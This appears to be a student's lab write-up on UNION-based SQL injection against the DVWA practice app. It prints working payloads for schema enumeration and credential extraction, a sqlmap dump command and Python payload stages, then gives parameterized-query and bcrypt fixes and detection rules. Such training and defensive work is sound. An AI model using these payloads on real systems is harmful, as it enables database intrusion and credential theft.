# Write-Up: UNION-Based Extraction, Automated Scanning, and Python Automation

---

## 1. VULNERABILITY: Unparameterized Query with Schema Exposure via information_schema

### Root Cause

The underlying vulnerability is identical to Week 7 — string concatenation in the SQL query. What Week 8 adds is a systematic demonstration of how far that single flaw can be exploited:

```sql
-- A single vulnerable parameter
SELECT first_name, last_name FROM users WHERE user_id = '$id'

-- Enables attackers to access MySQL's built-in metadata system:
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT user, password FROM users
```

### Why `information_schema` Makes SQLi Catastrophic

MySQL/MariaDB grants `SELECT` access to `information_schema` to every authenticated database user — including low-privilege application accounts like `app@localhost`. This means:

1. Any SQLi that works at all automatically grants access to the complete database schema
2. Attackers do not need prior knowledge of table or column names
3. The entire database structure is self-documented via SQL

**This is not a configuration weakness** — it is a fundamental property of MySQL that cannot be disabled without breaking normal application functionality. It means every SQLi that reaches an authenticated database connection is, by default, a full schema disclosure.

### Vulnerability Classification

| Property | Value |
|----------|-------|
| **Type** | SQL Injection |
| **Subtype** | UNION-Based In-Band — Full Schema Extraction |
| **CWE** | CWE-89: Improper Neutralization of Special Elements in SQL Command |
| **OWASP** | A03:2021 — Injection |
| **CVSS Score** | 8.8 High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L) |
| **Privileges Required** | Low (DVWA application login) |

---

## 2. EXPLOITATION: Three-Tool Attack Chain

### Tool 1: Manual UNION Extraction (Discovery Phase)

**Total requests: ~12 | Detection risk: Minimal**

```sql
-- Column count discovery
' ORDER BY 3-- -    → Error: 2 columns confirmed

-- UNION structure validation
' UNION SELECT NULL, NULL-- -    → No error: structure valid

-- Column position mapping
0' UNION SELECT 1, 2-- -    → 1=First name, 2=Surname

-- Schema extraction
0' UNION SELECT null, table_name FROM information_schema.tables
   WHERE table_schema=database()-- -    → guestbook, users

0' UNION SELECT null, column_name FROM information_schema.columns
   WHERE table_name='users'-- -    → user, password, ...

-- Data extraction
0' UNION SELECT user, password FROM users-- -    → 5 credential pairs
```

**Why `id=0` instead of `id=1`:**
`id=1` returns the real admin row plus the UNION row simultaneously. `id=0` matches no real user — only the UNION data appears. Cleaner output, one less row of noise.

---

### Tool 2: SQLmap Automated Extraction (Verification Phase)

**Total requests: 500-2000+ | Detection risk: High (immediate IDS trigger)**

```bash
sqlmap \
  -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=your_session_cookie_here; security=low" \
  --batch \
  -D dvwa -T users --dump
```

**SQLmap detected four injection types against DVWA Low:**
- UNION query (used for fast extraction)
- Error-based (alternate channel)
- Boolean-based blind (baseline detection)
- Time-based blind (fallback when others filtered)

**Result:** Identical credentials extracted, MD5 hashes auto-cracked via built-in wordlist.

**Why this matters:** sqlmap's multi-type detection reveals the application's full attack surface. A vulnerability that appears exploitable only via UNION may also be exploitable via time-based if a WAF blocks UNION — sqlmap surfaces all options simultaneously.

---

### Tool 3: Python `requests` Script (Targeted Automation)

**Total requests: 3 | Detection risk: Negligible**

```python
# Stage 1: Tables
"0' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -"

# Stage 2: Columns
"0' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -"

# Stage 3: Credentials
"0' UNION SELECT user, password FROM users-- -"
```

**The key advantage:** 3 requests total, each carrying a precise payload derived from manual testing. No scanning overhead, no enumeration noise — only the minimum requests required to extract the specific data needed.

**Noise comparison:**

| Method | Requests | Time | SOC Alert |
|--------|----------|------|-----------|
| Manual (12 payloads) | ~12 | 10+ minutes (human pace) | Unlikely |
| Python script (3 stages) | 3 | Seconds | Unlikely |
| SQLmap --dump | 500-2000+ | Minutes | Within seconds |

---

## 3. BUSINESS IMPACT: Full Database Disclosure

### What an Attacker Has After Week 8

After running the three-tool chain:

```
Schema knowledge:
  ✓ All database names on server (information_schema)
  ✓ All tables in target database
  ✓ All column names in all tables

Data extracted:
  ✓ All 5 user accounts
  ✓ All password hashes (MD5)
  ✓ All passwords cracked to plaintext

Time to full compromise:
  Manual discovery: ~40 minutes
  Python targeted extraction: 3 additional requests
  Hash cracking: < 1 second (MD5)
  Total: ~45 minutes from start to complete credential set
```

### Cascading Risk

```
Extracted: admin / password
         ↓
Credential reuse test:
  Same password on email? → Email access
  Same password on VPN?   → Internal network
  Same password on AWS?   → Cloud infrastructure
  Same password on GitHub? → Source code
         ↓
One SQLi + weak password storage = potential full infrastructure access
```

### Financial Exposure

**Affected organization (example):** SaaS platform, 100K users, $20M annual revenue

| Impact Category | Estimated Cost |
|----------------|----------------|
| Customer data notification | $200K-$500K |
| Regulatory fines (GDPR/PDPA) | $1M-$5M |
| Customer churn (15-25%) | $3M-$5M/year |
| Incident response | $200K-$500K |
| System hardening post-incident | $300K-$800K |
| **Estimated range** | **$4.7M-$11.8M** |

**Source:** IBM Cost of Data Breach Report 2023 — overall average breach: $4.45M; web application vector: $4.56M

---

## 4. TECHNICAL FIX: Parameterized Queries (Mandatory)

### The Only Complete Fix

```php
// VULNERABLE: String concatenation
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($db, $query);

// SECURE: Parameterized prepared statement
$stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);   // "i" = enforce integer type
$stmt->execute();
$result = $stmt->get_result();
```

**Effect on attack payloads:**

```
Attacker sends: 0' UNION SELECT user, password FROM users-- -

Without parameterization:
  Query becomes: WHERE user_id = '0' UNION SELECT user, password FROM users-- -'
  Result: Full credential extraction

With parameterization:
  id value is: 0' UNION SELECT user, password FROM users-- -
  Query becomes: WHERE user_id = [literal string above]
  Result: No user_id matches that string → empty result → attack neutralized
```

The SQL parser receives the query structure first, then binds the user input as data. The single quote in the payload is treated as a string character, never as SQL syntax.

### Replace MD5 with bcrypt

```php
// VULNERABLE: MD5 (no salt, no stretching, instant to crack)
$hash = md5($password);

// SECURE: bcrypt (salted, iterative, slow to crack)
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verification
if (password_verify($input, $stored_hash)) { /* login success */ }
```

**bcrypt cost=12:** OWASP minimum recommended value. Makes password verification take tens to hundreds of milliseconds (hardware-dependent) — negligible for legitimate login, computationally infeasible for bulk cracking.

---

## 5. POLICY FIX: Development and Detection Controls

### Policy 1: Parameterized Queries Mandatory
- All SQL interactions must use prepared statements or ORM
- SAST scanning in CI/CD pipeline: fail build on detected string concatenation into SQL
- Code review checklist item: SQL injection check before merge approval

### Policy 2: Password Storage Standard
- Approved: bcrypt (cost ≥ 12), Argon2id, scrypt
- Prohibited: MD5, SHA1, SHA256 without salt/stretching
- Annual audit of stored hash formats

### Policy 3: Database Least Privilege
```sql
-- Create restricted application account
CREATE USER 'app'@'localhost' IDENTIFIED BY '[strong-password]';

-- Grant only required permissions
GRANT SELECT, INSERT, UPDATE ON dvwa.guestbook TO 'app'@'localhost';
GRANT SELECT ON dvwa.users TO 'app'@'localhost';

-- information_schema remains readable (MySQL default)
-- but without SELECT on target tables, UNION attacks cannot reach data
```

**Effect:** Even if SQLi occurs:
- `UNION SELECT user, password FROM users` works only if `app` has `SELECT` on `users`
- Without that grant, the query fails with a privilege error
- Attack chain broken at Phase 6

---

## 6. DETECTION RULE: Identifying UNION-Based Extraction

### Sigma Rule: Systematic UNION Extraction

```yaml
title: SQL Injection — UNION-Based Table Enumeration Sequence
description: >
  Detects the characteristic payload progression of UNION-based
  SQL injection schema extraction: ORDER BY probing followed by
  information_schema queries
logsource:
  category: webserver
  product: any
detection:
  selection_order_by:
    http_request_uri|contains:
      - "ORDER+BY"
      - "ORDER%20BY"
  selection_information_schema:
    http_request_uri|contains:
      - "information_schema"
      - "information%5Fschema"
  timeframe: 5m
  condition: selection_order_by and selection_information_schema
falsepositives:
  - Legitimate security scanners under authorized assessment
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.89
```

### WAF Rule: information_schema Access

```
Block if request URL or body contains:
  Literal: information_schema
  Severity: Critical — schema enumeration confirmed
  Action: Block + Alert + Log source IP
  Note: No legitimate web application query needs
        information_schema in user-facing parameters
```

### SIEM Behavioral Alert

```
Alert if from single source IP within 10 minutes:
  1. Parameter value contains single quote → server returns 5xx
  2. Parameter value contains ORDER BY → server returns 200
  3. Parameter value contains UNION → server returns 200
  4. Parameter value contains information_schema → server returns 200

This sequence = confirmed UNION-based extraction in progress
Action: Immediate block + SOC notification
```

---

## Summary

**What This Week Adds to Week 7:**

| Week 7 | Week 8 |
|--------|--------|
| Manual credential extraction (12 requests) | Same — extended to include schema enumeration methodology |
| Understood injection mechanics | Added automation layer (sqlmap, Python) |
| Explained single payload chain | Compared three tools: noise, speed, use case |
| Remediation: parameterized queries | Added database least-privilege control |

**Core takeaway:** SQLi is not a single action. It is a chain of escalating queries. Each phase depends on the previous one, and the path from a single injectable parameter to full credential extraction takes 40 minutes with no specialized knowledge beyond what this portfolio documents.

---

**Status:** Week 8 Complete | Full Extraction Chain Documented | 6-Part Framework Applied

**References:**
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- SQLmap: https://sqlmap.org/
- IBM Cost of Breach 2023: https://www.ibm.com/reports/data-breach
- Python requests: https://docs.python-requests.org/
